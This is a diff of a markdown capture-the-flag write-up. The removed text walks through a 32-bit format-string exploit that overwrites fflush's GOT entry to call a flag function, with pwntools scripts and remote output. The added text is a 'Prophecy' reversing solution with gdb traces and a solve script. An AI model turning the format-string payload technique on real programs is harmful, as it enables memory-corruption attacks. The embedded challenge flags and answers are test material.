@@ -1,230 +1,293 @@
-#	bbpwn
+# Prophecy
 
-Let's take a look at the binary they gave us:
+Full Disclosure, I solved this challenge the day after the competition ended.
+
+Let's take a look at the binary:
 ```
-$	file 32_new 
-32_new: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=da5e14c668579652906e8dd34223b8b5aa3becf8, not stripped
-$	pwn checksec 32_new 
-[*] '/Hackery/backdoor/bbpwn/32_new'
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x8048000)
+$	file prophecy 
+prophecy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, not stripped
 ```
 
-So we can see it is a 32 bit elf with a Non-Executable stack. Let's try running it.
+So we can see it is a 64 bit elf. Let's run it!
 
 ```
-$	./32_new 
-Hello baby pwner, whats your name?
-give me the flag
-Ok cool, soon we will know whether you pwned it or not. Till then Bye give me the flag
+$	./prophecy 
+----------------------------------------------
+|PROPHECY PROPHECY PROPHECY PROPHECY PROPHECY| 
+----------------------------------------------
+[*]Give me the secret name
+>>guyinatuxedo
+[*]Give me the key to unlock the prophecy
+>>supersecretkey
 ```
 
-So it prompted us for input, then it printed out the data we sent it. Since it is printing out user defined data, this might be a format string bug. Let's test it by giving it `%x` formatters:
+So we can see that it prompts us for  a name and a key. When we look at the code in IDA, it is clear that the binary has been obfuscated. The program is ran in a while true loop, and the code has been split into a lot of diffenrent sections. Which section runs depends on the value of the integer `code_flow`. With that knowledge, let's find the pieces of code that scan in our name and secret.
 
+Name: (address: 0x40254b)
 ```
-$	./32_new 
-Hello baby pwner, whats your name?
-%x.%x.%x.%x.%x
-Ok cool, soon we will know whether you pwned it or not. Till then Bye 8048914.ff98e0d8.1.f739a618.36e
+LODWORD(v5) = std::operator<<<std::char_traits<char>>(&std::cout, "|PROPHECY PROPHECY PROPHECY PROPHECY PROPHECY| ");
+LODWORD(v6) = std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
+v372 = v6;
+LODWORD(v7) = std::operator<<<std::char_traits<char>>(&std::cout, "----------------------------------------------");
+LODWORD(v8) = std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
+v371 = v8;
+LODWORD(v9) = std::operator<<<std::char_traits<char>>(&std::cout, "[*]Give me the secret name");
+LODWORD(v10) = std::ostream::operator<<(v9, &std::endl<char,std::char_traits<char>>);
+v370 = v10;
+LODWORD(v11) = std::operator<<<std::char_traits<char>>(&std::cout, ">>");
+v369 = v11;
+name_bytes_scanned = read(0, (void *)name_input, 0xC8uLL);
+code_flow_trans0 = 0xAC75072E;
+name_input_check = name_bytes_scanned > 0;
+v14 = (((_BYTE)x_28 - 1) * (_BYTE)x_28 & 1) == 0;
+if ( (~((unsigned __int8)~(y_29 < 10) | (unsigned __int8)~v14) & 1 | (unsigned __int8)((y_29 < 10) ^ v14)) & 1 )
+  code_flow_trans0 = -1595152981;
+code_flow = code_flow_trans0;
 ```
 
-So this verifies that it is a format string bug. We know this because when we gave it the formatter for printf to print data as hex `%x`, it printed out hex strings that we didn't give it/ Let's take a look at the code in IDA so we can see what we can do with this vulnerabillity.
+Here we can see that it prompts for the secret name. It scans in 200 bytes into `name_input` 200 bytes, then checks to see if it scanned in more than 0 bytes. Checkint the xreferences for `name_input` we find the following code block.
 
+address: 0x402b57
 ```
-int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+does_input_contain_starcraft = strstr(name_input, ".starcraft");
+v34 = -2012679336;
+starcraft_exits_check = does_input_contain_starcraft != 0LL;
+```
+
+Looking here, we can see that it checks to see if `name_input` contains the string `.starcraft`. So the name we need to input is probably `.starcraft`
+
+Secret: (address: 0x40289d)
+```
 {
-  char input_data; // [sp+18h] [bp-200h]@1
-  char printed_string; // [sp+E0h] [bp-138h]@1
-  int v5; // [sp+20Ch] [bp-Ch]@1
-
-  v5 = *MK_FP(__GS__, 20);
-  puts("Hello baby pwner, whats your name?");
-  fflush(stdout);
-  fgets(&input_data, 200, edata);
-  fflush(edata);
-  sprintf(&printed_string, "Ok cool, soon we will know whether you pwned it or not. Till then Bye %s", &input_data);
-  fflush(stdout);
-  printf(&printed_string);
-  fflush(stdout);
-  exit(1);
+  LODWORD(v21) = std::operator<<<std::char_traits<char>>(
+  &std::cout,
+  "[*]Give me the key to unlock the prophecy");
+  LODWORD(v22) = std::ostream::operator<<(
+  v21,
+  &std::endl<char,std::char_traits<char>>);
+  v364 = v22;
+  LODWORD(v23) = std::operator<<<std::char_traits<char>>(
+  &std::cout,
+  ">>");
+  v363 = v23;
+  key_input_byte_count = read(0, key_input, 0x12CuLL);
+  v25 = 0x661C008B;
+  key_input_check = key_input_byte_count > 0;
+  v26 = (((_BYTE)x_28 - 1) * (_BYTE)x_28 & 1) == 0;
+  if ( (~((unsigned __int8)~(y_29 < 10) | (unsigned __int8)~v26) & 1 | (unsigned __int8)((y_29 < 10) ^ v26)) & 1 )
+    v25 = 0xC0F1DACD;
+  code_flow = v25;
 }
 ```
 
-So we can see here the function of the code. It first scans in data through an fgets call, then appends our input the the back of a string using `sprintf`, then prints out that string without formatting it which is where we get the format string exploit. Using this we should be able to overwrite the address of `fflush` with something else. Looking through the code, we find a function that looks appealing:
+Here we can see that it prints out `[*]Give me the key to unlock the prophecy`. Proceeding that it makes a read call, which it will scan 300 (0x12c) bytes into `key_input`. It then make sures that the read scanned in more than 0 bytes. Checking the xreferences for `key_input`we find a bit of code that alters `key_input`:
 
+address:	0x402a3d
 ```
-int flag(void)
-{
-  return system("cat flag.txt");
-}
+*((_BYTE *)key_input + strlen((const char *)key_input) - 1) = 0;
 ```
 
-This is the function `flag`., It appears to just cat out the `flag.txt` file. So if we overwrote the address of `fflush` with the address of the `flag` function, when it tried to run the fflush function after the format string exploit it would run the `flag` function and we would get the flag. In order to do that, first we need to find how far away our input on the stack is for the format string exploit.
+This line of code will essentially set the byte directly before the first null byte equal to a null byte. This is because `strlen` will count the amount of bytes untill a null byte. Read by itself does not null terminate. Proceeding that, after checking the xreferences for `name_input` and `key_input` we find the next code block.
 
+address: 0x402f08
 ```
-./32_new 
-Hello baby pwner, whats your name?
-0000.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
-Ok cool, soon we will know whether you pwned it or not. Till then Bye 0000.8048914.ffbbd4c8.1.f73f6618.36e.f73fc668.ffbbd774.ffbbd514.ffbbd510.30303030.2e78252e.252e7825
-```
-
-So we an see here our input is 10 words away from our printf call. Next thing we need to find out is the address of fflush, which is the address we are overwriting:
-
-```
-objdump -R 32_new | grep fflush
-0804a028 R_386_JUMP_SLOT   fflush@GLIBC_2.0
-```
-
-So the address that we need to overwrite is at `0x804a028`. Now we need to find the address that we need to write to it, which is the addressof `flag`. 
-
-```
-$	objdump -D 32_new | grep flag
-0804870b <_Z4flagv>:
-0804883c <_GLOBAL__sub_I__Z4flagv>:
+name_input_transfer = name_input;
+name_input_length = strlen(name_input);
+*appended_filename = strncat(
+tmp,
+name_input_transfer,
+name_input_length);
+file_pointer = strtok(*appended_filename, "\n");
+*stream = fopen(file_pointer, "wb");
+write = fwrite(key_input, 1uLL, 0x12CuLL, *stream);
+stream_transfer = *stream;
+v355 = write;
+v48 = fclose(stream_transfer);
+appended_filename_transfer = *appended_filename;
+v354 = v48;
+v50 = fopen(appended_filename_transfer, "rb");
 ```
 
-So we see that the address we need to overwrite is `0x0804870b`.So now that we know what to write, and where to write it there is only one more thing left. In order to write the address `0x0804870b` we need to print 0x0804780b bytes. Reasonably speaking that just isn't feasible. What we can do is write to the address three times (will explain why three later), so effictively we will have to print way less bytes. 
+So we can see here some manipulation going on with our two inputs. First it takes `name_input` (which because of a previous check should be `.starcraft`)  and appends it to the end of `/tmp/` (look at it's value in gdb). Proceeding that, it strips a newline character from the appended filename. After that it opens up the appended string as a writeable file, then writes 0x12c bytes of `key_input` to it (it will write more bytes ). Later on it opens the same file as a readable file. 
 
-A couple of things, first we will have to write to the least singificant bit first. Secondly each subsequent write will be greater than the last. First let's see how much data we are writing to the adress without adding any extra bytes. We will do so with this python script:
+tl;dr If the name you input is `.starcraft` it will create the file `/tmp/.starcraft` and write the input you gave it as a key to it (plus the difference from the length of the input to 0x12c). It ends off with opening the file you created as readable,.
+
+So the file it created is probably read later on in the code. We see in the imports that the function fread is in the code. Let's run the binary in gdb and set a breakpoint for `fread` so we can see where our input is read:
 
 ```
-#Import pwntools
+gdb-peda$ b *fread
+Breakpoint 1 at 0x400b30
+gdb-peda$ r
+Starting program: /Hackery/csaw17/prophecy/prophecy 
+----------------------------------------------
+|PROPHECY PROPHECY PROPHECY PROPHECY PROPHECY| 
+----------------------------------------------
+[*]Give me the secret name
+>>.starcraft
+[*]Give me the key to unlock the prophecy
+>>15935728
+[*]Interpreting the secret....
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x4 
+RBX: 0x0 
+RCX: 0x619c20 --> 0xfbad2488 
+RDX: 0x4 
+RSI: 0x1 
+RDI: 0x7fffffffd3c0 --> 0x3c2700 ('')
+RBP: 0x7fffffffdee0 --> 0x7fffffffdf60 --> 0x406380 (<__libc_csu_init>:	push   r15)
+RSP: 0x7fffffffd268 --> 0x403197 (<_Z6parserv+8455>:	mov    r8d,0x1cd65a05)
+RIP: 0x7ffff71d73d0 (<__GI__IO_fread>:	push   r13)
+R8 : 0xced24a00 
+R9 : 0xced24a01 
+R10: 0x634 
+R11: 0x7ffff71d73d0 (<__GI__IO_fread>:	push   r13)
+R12: 0x400f01 (<_GLOBAL__sub_I_prophecy.cpp+273>:	add    ecx,esi)
+R13: 0x7fffffffe001 --> 0x0 
+R14: 0xffffffff 
+R15: 0xffffff01
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x7ffff71d73c4 <__GI__IO_fputs+388>:	mov    rdi,rsi
+   0x7ffff71d73c7 <__GI__IO_fputs+391>:	call   0x7ffff71886f0 <_Unwind_Resume>
+   0x7ffff71d73cc:	nop    DWORD PTR [rax+0x0]
+=> 0x7ffff71d73d0 <__GI__IO_fread>:	push   r13
+   0x7ffff71d73d2 <__GI__IO_fread+2>:	push   r12
+   0x7ffff71d73d4 <__GI__IO_fread+4>:	push   rbp
+   0x7ffff71d73d5 <__GI__IO_fread+5>:	push   rbx
+   0x7ffff71d73d6 <__GI__IO_fread+6>:	mov    rbx,rsi
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffd268 --> 0x403197 (<_Z6parserv+8455>:	mov    r8d,0x1cd65a05)
+0008| 0x7fffffffd270 --> 0x0 
+0016| 0x7fffffffd278 --> 0x0 
+0024| 0x7fffffffd280 --> 0x0 
+0032| 0x7fffffffd288 --> 0x0 
+0040| 0x7fffffffd290 --> 0x0 
+0048| 0x7fffffffd298 --> 0x0 
+0056| 0x7fffffffd2a0 --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, __GI__IO_fread (buf=0x7fffffffd3c0, size=0x1, count=0x4, fp=0x619c20) at iofread.c:31
+31	iofread.c: No such file or directory.
+
+```
+
+So we can see from the stack section of the output from gdb, that there is a call to fread at `0x403197`. Note that this is the only fread call we get. When we go to the section of code in ida, we see the following:
+
+address:	0x403197
+```
+v59 = fread(input:0, 1uLL, 4uLL, *v540);
+v60 = 0x1CD65A05;
+*(_DWORD *)input:0:trans = *(_DWORD *)input:0;
+check:0 = *(_DWORD *)input:0:trans == 0x17202508;
+```
+
+So we can see here that it will read 4 bytes of data from the file `/tmp/.starcraft` and then creates a bool `check:0` that is true if the 4 bytes of data it scans in is equal to the hex string `0x17202508`. We can continue where we left off in gdb to see exactly what data it's scanning in:
+
+```
+gdb-peda$ finish
+```
+
+after the fread call finishes, set a breakpoint for the cmp instruction for the bool:
+
+```
+0x0000000000403197 in parser() ()
+Value returned is $1 = 0x4
+gdb-peda$ b *0x4031c1
+Breakpoint 2 at 0x4031c1
+gdb-peda$ c
+Continuing.
+```
+
+and once we reach the compare
+
+```
+Breakpoint 2, 0x00000000004031c1 in parser() ()
+gdb-peda$ x/x $rcx
+0x7fffffffd3a0:	0x0000000033393531
+```
+
+So we can see that the values it's compare against the hex string `0x17202508` are `1593` which are the fircst four characters we inputted. Sonow that we know that the first four characters So with this, we now know what we need to input to pass the first check.
+
+Now this isn't the only check the binary does.  It does six more checks, so these are all of the checks:
+
+```
+0x4031c1:	input = 0x17202508
+0x4034eb:	input = 0x4b
+0x403cb4:	input = 0x3
+0x404296:	input = 0xe4ea93
+0x40461d:	input = "LUTAREX"
+0x4049bc:	input = 0x444556415300
+0x404d60:	input = 0x4c4c4100
+``` 
+
+So there are a couple of formatting errors you have to worry about, but once you put it all together you get this:
+
+```
+#First import pwntools
 from pwn import *
 
-#Establish the target process, or network connection
-target = process('./32_new')
-#target = remote('163.172.176.29', 9035)
+#Establish the target, either remote connection or local process
+target = process('./prophecy')
+#target = remote("reversing.chal.csaw.io", 7668)
 
-#Attach gdb if it is a process
+#Attach gdb
 gdb.attach(target)
 
-#Print the first line of text
-print target.recvline()
+#Print out the starting menu, prompt for input from user, then send filename
+print target.recvuntil(">>")
+raw_input()
+target.sendline(".starcraft")
 
-#Prompt for input, to pause for gdb
+#Prompt for user input to pause
 raw_input()
 
-#Establish the addresses which we will be writing to
-fflush_adr0 = p32(0x804a028)
-fflush_adr1 = p32(0x804a029)
-fflush_adr2 = p32(0x804a02b)
-
-#Establish the necissary offputs for our input, so we can write to the addresses
-fmt_string0 = "%10$n"
-fmt_string1 = "%11$n"
-fmt_string2 = "%12$n"
-
-#Form the payload
-payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + fmt_string0 + fmt_string1 + fmt_string2
-
-#Send the payload
-target.sendline(payload)
+#Form the data to pass the check, then send it
+check0 = "\x08\x25\x20\x17"
+check1 = "\x4b"*4 + "\x00"  +  "\x4b"*4
+check2 = "\x03"*1
+check3 = "\x93\xea\xe4\x00"
+check4 = "\x5a\x45\x52\x41\x54\x55\x4c"
+check5 = "\x00\x53\x41\x56\x45\x44"
+check6 = "\x00\x41\x4c\x4c"
+target.send(check0 + check1 + check2 + check3 + check4 + check5 + check6)
 
 #Drop to an interactive shell
 target.interactive()
 ```
 
-and when we run the script, we and pass the process to  gdb:
-```
-gdb-peda$ b *0x80487dc
-gdb-peda$ c
-```
-
-after the breakpoint:
+and when we run it against the server:
 
 ```
-Breakpoint 1, 0x080487dc in main ()
-gdb-peda$ x/x 0x804a028
-0x804a028:	0x52
-gdb-peda$ x/w 0x804a028
-0x804a028:	0x52005252
-```
-
-So we can see a couple of things. Firstly that we are writing to the first, second, and fourth byte of the `fflush` address. Secondly that the initial starting value we write is `0x52`. This is a problem since we need to write the value `0x0b` to the first byte, which is smaller than `0x52`. This can be fixed if instead we write `0x10b` to the first byte, whcih will overfow into the second byte. However it will leave the first byte equal to `0x0b`.
-
-To calculate the amount of bytes we need to write, we can just use python:
-```
->>> 0x10b - 0x52
-185
-```
-
-So we will need to print 185 additional bytes for the first write. For the second write, we need to set the second and third bytes equal to `0x0487`. Since we added 185 bytes to the first write, it should write 185 + 0x52 = 267 bytes by default. So in order to reach `0x0487` we will need to print an additional `0x0487 - 267 = 892` bytes to write the appropriate value.
-
-Lastly we just have to figure out the amount of bytes we need to write to set the fourth byte euqal to `0x08`. Of course by now this write is going to overflow into other bytes outside of this address, howver it shouldn't stop the exploit. Write now it should write `892 + 267 = 1159` bytes of data without us adding anything. let's use python to see how many more additional bytes we will need to print, in order for the last byte of the hex string we write to be `0x08`.
-
-```
->>> hex(1159)
-'0x487'
->>> 0x508 - 0x487
-129
-```
-
-So for the last write, we will need to print an additional 129 bytes. With all of this information, we can write the exploit. It will look something like this:
-
-```
-payload = first_adr + second_adr + third_adr + first_byte_print + first_offset_write + second_byte_print + second_offset_write + third_byte_print + third_offset_write
-``` 
-
-and here is the python code for that:
-```
-#Import pwntools
-from pwn import *
-
-#Establish the target process, or network connection
-#target = process('./32_new')
-target = remote('163.172.176.29', 9035)
-
-#Attach gdb if it is a process
-#gdb.attach(target)
-
-#Print the first line of text
-print target.recvline()
-
-#Prompt for input, to pause for gdb
-raw_input()
-
-#Establish the addresses which we will be writing to
-fflush_adr0 = p32(0x804a028)
-fflush_adr1 = p32(0x804a029)
-fflush_adr2 = p32(0x804a02b)
-
-#Establish the amount of bytes needed to be printed in order to write correct value
-flag_val0 = "%185x"
-flag_val1 = "%892x"
-flag_val2 = "%129x"
-
-#Establish the necissary offputs for our input, so we can write to the addresses
-fmt_string0 = "%10$n"
-fmt_string1 = "%11$n"
-fmt_string2 = "%12$n"
-
-#Form the payload
-payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + flag_val0 + fmt_string0 + flag_val1 + fmt_string1 + flag_val2 + fmt_string2
-
-#Send the payload
-target.sendline(payload)
-
-#Drop to an interacrtive shell
-target.interactive()
-```
-
-and when we run the exploit:
-```
-$	python exploit.py 
-[+] Opening connection to 163.172.176.29 on port 9035: Done
-Hello baby pwner, whats your name?
-
-input
+$	python solve.py 
+[+] Opening connection to reversing.chal.csaw.io on port 7668: Done
+----------------------------------------------
+|PROPHECY PROPHECY PROPHECY PROPHECY PROPHECY| 
+----------------------------------------------
+[*]Give me the secret name
+>>
+give me
+the flag
 [*] Switching to interactive mode
-flag{hey_c0ngr4ts_Y0u_pwn3d_1t_y0u_4r3_n0_l0ng3r_a_b4by}
-Ok cool, soon we will know whether you pwned it or not. Till then Bye (\xa0\x0)\xa0\x0+\xa0\x0                                                                                                                                                                                  8048914                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ffcefc48                                                                                                                                1
+[*]Give me the key to unlock the prophecy
+>>[*]Interpreting the secret....
+[*]Waiting....
+[*]I do not join. I lead!
+[*]You'll see that better future Matt. But it 'aint for the likes of us.
+[*]The xel'naga, who forged the stars,Will transcend their creation....
+[*]Yet, the Fallen One shall remain,Destined to cover the Void in shadow...
+[*]Before the stars wake from their Celestial courses,
+[*]He shall break the cycle of the gods,Devouring all light and hope.
+[*]It begins with the Great Hungerer. It ends in utter darkness.
+==========================================================================================================
+[*]ZERATUL:flag{N0w_th3_x3l_naga_that_f0rg3d_us_a11_ar3_r3turn1ng_But d0_th3y_c0m3_to_sav3_0r_t0_d3str0y?}
+==========================================================================================================
+[*]Prophecy has disappered into the Void....
 [*] Got EOF while reading in interactive
 $ 
 [*] Interrupted
-[*] Closed connection to 163.172.176.29 port 9035
+[*] Closed connection to reversing.chal.csaw.io port 7668
 ```
 
-Just like that, we captured the flag `flag{hey_c0ngr4ts_Y0u_pwn3d_1t_y0u_4r3_n0_l0ng3r_a_b4by}`.
+Just like theat, we captured the flag!
